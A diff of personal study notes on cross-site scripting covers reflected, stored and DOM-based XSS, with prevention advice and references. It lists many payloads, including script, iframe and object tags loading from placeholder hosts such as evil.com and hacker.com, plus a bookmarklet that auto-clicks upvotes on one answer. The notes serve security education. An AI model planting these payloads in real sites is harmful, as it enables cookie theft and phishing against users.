@@ -1,8 +1,79 @@
-what is XSS?
-1. Cross Site Scripting known as a code injection attack allowing the injection of malicious code into a website.
-2. XSS is currently one of the most common website attacks with almost every website requiring the user to have javascript turned on.
+===================================== 14-03-2021 ============================================
+What is Cross-site Scripting (XSS)?
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. 
 
-when you can get your xss permanently on a website all those who visit that page will have the javascript executed by their browser
+XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
+
+There are three main types of XSS attacks. These are:
+--------------------------------------------------------
+1) Reflected XSS, where the malicious script comes from the current HTTP request.
+2) Stored XSS, where the malicious script comes from the website's database.
+3) DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
+
+Reflected cross-site scripting
+------------------------------
+It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
+
+Here is a simple example of a reflected XSS vulnerability:
+    https://insecure-website.com/status?message=All+is+well.
+    <p>Status: All is well.</p>
+
+The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:
+    https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+    <p>Status: <script>/* Bad stuff here... */</script></p>
+
+If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser
+
+Reflected attack what can it do?
+-----------------------------------
+1. Redirect to a phishing
+2. Steal cookie information
+3. Force the user to make an action
+
+javascript:document.querySelectorAll('.Upvote').forEach((b)=>{if(b.getAttribute('action_target') == '{"aid": 49528370, "type": "answer"}'){b.click()}})
+
+
+Stored cross-site scripting
+------------------------------
+Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and 
+includes that data within its later HTTP responses in an unsafe way.
+
+for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order.
+
+Here is a simple example of a stored XSS vulnerability. A message board application lets users submit messages, which are displayed to other users:
+
+<p>Hello, this is my message!</p>
+
+The application doesn't perform any other processing of the data, so an attacker can easily send a message that attacks other users:
+
+<p><script>/* Bad stuff here... */</script></p>
+
+DOM-based cross-site scripting
+-------------------------------------
+DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
+
+In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:
+
+var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+
+If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:
+
+You searched for: <img src=1 onerror='/* Bad stuff here... */'>
+
+In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.
+
+What can XSS be used for?
+---------------------------
+An attacker who exploits a cross-site scripting vulnerability is typically able to:
+1) Impersonate or masquerade as the victim user.
+2) Carry out any action that the user is able to perform.
+3) Read any data that the user is able to access.
+4) Capture the user's login credentials.
+5) Perform virtual defacement of the web site.
+6) Inject trojan functionality into the web site.
+
 
 What can it do ?
 1. Malicious javascript can be used to do all sorts of malicious tasks.
@@ -10,28 +81,148 @@ What can it do ?
 3. Malicious Javascript can modify the page to make it look different or behave different 
 4. It can even send you to another website taking data with you.
 
-Non persistent scripting attack
-these scipts are not persistent on website
-The attack only affects the user running the script
-It may indicate that website creater may have forget to protect input fields
-A Non persistent script can also be referred to as reflected XSS
 
-Reflected attack?
-Reflected is harnessed by attaching the malicious script at the end of URL/link, 
-Though it may be obvious to see code on the end of a URL, techniques of hiding it are possible.
-Also with the service of link shortening services this can be very deadly
+What Can the Attacker Do with JavaScript?
+----------------------------------------------
+1) Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
 
-Reflected attack what can it do?
-1. Redirect to a phishing
-2. Steal cookie information
-3. Force the user to make an action
+2) JavaScript can read the browser DOM and make arbitrary modifications to it. Luckily, this is only possible within the page where JavaScript is running.
 
-javascript:document.querySelectorAll('.Upvote').forEach((b)=>{if(b.getAttribute('action_target') == '{"aid": 49528370, "type": "answer"}'){b.click()}})
+3) JavaScript can use the XMLHttpRequest object to send HTTP requests with arbitrary content to arbitrary destinations.
 
-Persistent script?
-Usually having the malicious code stored in the website database
+4) JavaScript in modern browsers can use HTML5 APIs. For example, it can gain access to the user’s geolocation, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.
 
-Finding inject locations
-comments,submission forms, contact forms, posts, uploads etc
+Cross-site Scripting Attack Vectors
+-----------------------------------
+Finding inject locations -> comments,submission forms, contact forms, posts, uploads etc
 
-Malicious attack
+The following is a list of common XSS attack vectors that an attacker could use to compromise the security of a website
+
+<script> tag
+--------------------
+<!-- External script -->
+<script src=http://evil.com/xss.js></script>
+<!-- Embedded script -->
+<script> alert("XSS"); </script>
+
+JavaScript events
+-----------------------
+JavaScript event attributes such as onload and onerror can be used in many different tags. This is a very popular XSS attack vector.
+
+<!-- onload attribute in the <body> tag -->
+------------------------------------------------
+<body onload=alert("XSS")>
+<body> tag
+An XSS payload can be delivered inside the <body> by using event attributes (see above) or other more obscure attributes such as the background attribute.
+
+<!-- background attribute -->
+--------------------------------------------
+<body background="javascript:alert("XSS")">
+<img> tag
+Some browsers execute JavaScript found in the <img> attributes.
+
+<!-- <img> tag XSS -->
+---------------------------
+<img src="javascript:alert("XSS");">
+<!--  tag XSS using lesser-known attributes -->
+<img dynsrc="javascript:alert('XSS')">
+<img lowsrc="javascript:alert('XSS')">
+
+<iframe> tag
+-----------------
+The <iframe> tag lets you embed another HTML page in the current page. An IFrame may contain JavaScript but JavaScript in the IFrame does not have access to the DOM of the parent page due to the Content Security Policy (CSP) of the browser. However, IFrames are still very effective for pulling off phishing attacks.
+
+<!-- <iframe> tag XSS -->
+-----------------------------------
+<iframe src="http://evil.com/xss.html">
+
+<input> tag
+-----------------------
+In some browsers, if the type attribute of the <input> tag is set to image, it can be manipulated to embed a script.
+
+<!-- <input> tag XSS -->
+<input type="image" src="javascript:alert('XSS');">
+<link> tag
+The <link> tag, which is often used to link to external style sheets, may contain a script.
+
+<!-- <link> tag XSS -->
+---------------------------------
+<link rel="stylesheet" href="javascript:alert('XSS');">
+
+<table> tag
+---------------------
+The background attribute of the <table> and <td> tags can be exploited to refer to a script instead of an image.
+
+<!-- <table> tag XSS -->
+----------------------------------
+<table background="javascript:alert('XSS')">
+
+<!-- <td> tag XSS -->
+----------------------
+<td background="javascript:alert('XSS')">
+
+<div> tag
+---------------------------
+The <div> tag, similar to the <table> and <td> tags, can also specify a background and therefore embed a script.
+
+<!-- <div> tag XSS -->
+-------------------------------
+<div style="background-image: url(javascript:alert('XSS'))">
+
+<!-- <div> tag XSS -->
+-----------------------------------
+<div style="width: expression(alert('XSS'));">
+
+<object> tag
+-----------------------
+The <object> tag can be used to include a script from an external site.
+
+<!-- <object> tag XSS -->
+-------------------------------------
+<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
+
+
+CROSS-SITE SCRIPTING ATTACK EXAMPLE
+-----------------------------------------
+The most common example of XSS is a basic coded search engine for a website. The site search script is in this format:
+
+http://www.vulnerablewebsite.com/search/query?q=Hdiv%20XSS
+Once something has been searched for, the script displays on the webpage something along the lines of:
+
+"Results for Hdiv XSS here"
+Simply displaying the search string straight onto the webpage without performing any validation checks. An attacker could insert a script and if no sanitation checks are being performed, this will just be displayed straight onto the webpage. This could be used to display anything the attacker wants.
+
+http://www.vulnerablewebsite.com/search/query?q=<script>alert("Hdiv XSS");</script>
+
+
+How to prevent XSS attacks
+------------------------------------
+In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:
+
+1) Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+2) Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+
+3) Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
+
+4) Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+
+
+Common questions about cross-site scripting
+-----------------------------------------------
+How common are XSS vulnerabilities? XSS vulnerabilities are very common, and XSS is probably the most frequently occurring web security vulnerability.
+
+How common are XSS attacks? It is difficult to get reliable data about real-world XSS attacks, but it is probably less frequently exploited than other vulnerabilities.
+
+What is the difference between XSS and CSRF? XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.
+
+What is the difference between XSS and SQL injection? XSS is a client-side vulnerability that targets other application users, while SQL injection is a server-side vulnerability that targets the application's database.
+
+How do I prevent XSS in PHP? Filter your inputs with a whitelist of allowed characters and use type hints or type casting. Escape your outputs with htmlentities and ENT_QUOTES for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.
+
+How do I prevent XSS in Java? Filter your inputs with a whitelist of allowed characters and use a library such as Google Guava to HTML-encode your output for HTML contexts, or use JavaScript Unicode escapes for JavaScript contexts.
+
+
+References
+https://hdivsecurity.com/owasp-xss
+https://portswigger.net/web-security/cross-site-scripting
+https://www.acunetix.com/websitesecurity/cross-site-scripting/
